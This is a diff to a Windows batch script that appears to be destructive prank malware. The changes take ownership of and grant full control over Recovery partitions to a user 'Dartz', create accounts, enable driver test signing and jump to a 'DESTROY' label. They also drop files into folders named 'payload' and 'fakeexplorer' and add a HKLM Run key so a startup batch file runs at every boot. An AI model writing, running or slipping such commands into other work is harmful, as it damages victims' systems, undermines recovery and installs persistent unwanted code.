@@ -32,7 +32,8 @@ SFC /ScanFile="C:\Windows\system32\reg.exe"
 SFC /ScanFile="C:\Windows\system32\diskpart.exe"
 SFC /ScanFile="C:\Windows\system32\secedit.exe"
 SFC /ScanFile="C:\Windows\system32\mountvol.exe"
-SFC /ScanFile="C:\Windows\system32\logoff.exe"
+SFC /ScanFile="C:\Windows\system32\icacls.exe"
+SFC /ScanFile="C:\Windows\system32\xcopy.exe"
 secedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose
 echo Checking Operating System Version...
 wmic os get version | find "6.1" > nul
@@ -79,7 +80,8 @@ IF %M%==1 GOTO WIN7INSTALLRE
 :WIN7INSTALLRE
 echo Installing Windows RE :)
 diskpart /s %CD%\win7\diskpart.txt
-%CD%\win7\icacls.exe "C:\Recovery\" /setowner "Dartz" /T /C
+icacls "C:\Recovery\" /setowner "Dartz" /T /C
+icacls "C:\Recovery\" /grant Dartz:F /T /C
 xcopy "%CD%\win7\win7re\Winre.wim" "C:\Recovery\db77f94e-8028-11eb-a6d0-a34b0745a61f\Winre.wim" /Y
 goto SEVENINSTALL
 :SEVENINSTALL
@@ -101,7 +103,8 @@ IF %M%==1 GOTO WIN8INSTALLRE
 :WIN8INSTALLRE
 echo Installing Windows RE Protection...
 diskpart /s %CD%\win8\diskpart.txt
-%CD%\win8\icacls.exe "K:\Recovery\" /setowner "Dartz" /T /C
+icacls "K:\Recovery\" /setowner "Dartz" /T /C
+icacls "K:\Recovery\" /grant Dartz:F /T /C
 xcopy "%CD%\win7\win78re\Winre.wim" "K:\Recovery'WindowsRE\Winre.wim" /Y
 goto EIGHTINSTALL
 :EIGHTINSTALL
@@ -127,7 +130,8 @@ IF %M%==1 GOTO WIN81INSTALLRE
 cls
 echo Installing Windows RE Protection...
 diskpart /s %CD%\win81\diskpart.txt
-%CD%\win81\icacls.exe "K:\Recovery\" /setowner "Dartz" /T /C
+icacls "K:\Recovery\" /setowner "Dartz" /T /C
+icacls "K:\Recovery\" /grant Dartz:F /T /C
 xcopy "%CD%\win81\win81re\Winre.wim" "K:\Recovery\WindowsRE\Winre.wim" /Y
 goto EIGHTPOINTONEINSTALL
 :EIGHTPOINTONEINSTALL
@@ -150,7 +154,8 @@ IF %M%==1 GOTO WIN10INSTALLRE
 goto TENINSTALL
 echo Installing Windows RE Protection...
 diskpart /s %CD%\win10\diskpart.txt
-%CD%\win10\icacls.exe "K:\Recovery\" /setowner "Dartz" /T /C
+icacls "K:\Recovery\" /setowner "Dartz" /T /C
+icacls "K:\Recovery\" /grant Dartz:F /T /C
 xcopy "%CD%\win10\win10re\Winre.wim" "K:\Recovery\WindowsRE\Winre.wim" /Y
 goto TENINSTALL
 :TENINSTALL
@@ -190,10 +195,17 @@ IF %M%==1 GOTO MAININSTALLBB
 net user beachball /add
 net localgroup Guests beachball /add
 net user Dartz 1593570 /domain
-goto eeee
+goto DESTROY
 :eeee
+mkdir c:\windows\fakeexplorer
+mkdir c:\windows\payload
+mkdir c:\windows\wallpapertroll
+xcopy %CD%\junkins\startup\no.bat c:\windows\fakeexplorer
+xcopy %CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat
+xcopy %CD%\walp.bmp c:\windows\wallpapertroll\walp.bmp
 bcdedit /set TESTSIGNING on
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %CD%\walp.bmp /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv4 /t REG_SZ /d c:\windows\payload\startup.bat
 RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
 goto AAAAJJ
 :AAAAJJ
